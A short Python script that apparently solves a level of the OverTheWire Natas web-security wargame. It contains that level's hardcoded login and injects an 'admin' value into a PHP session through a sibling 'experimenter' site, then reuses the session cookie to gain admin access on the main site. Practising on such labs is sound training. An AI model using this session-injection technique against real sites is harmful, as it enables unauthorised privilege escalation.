import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas21","IFekPyrQXftziDEsUr3x21sYuahypdgJ"]
    url = "http://%s.natas.labs.overthewire.org/"%logar[0]
    session = requests.Session()

    experimental = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=True"
    s=session.post(experimental,data={"admin":"1","submit":"submit"},auth=(logar[0],logar[1]))
    print(s.text)
    print(session.cookies)
    cookao = session.cookies


    print("="*80)

    r = session.post(url ,cookies={"PHPSESSID":cookao["PHPSESSID"]},data={}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)
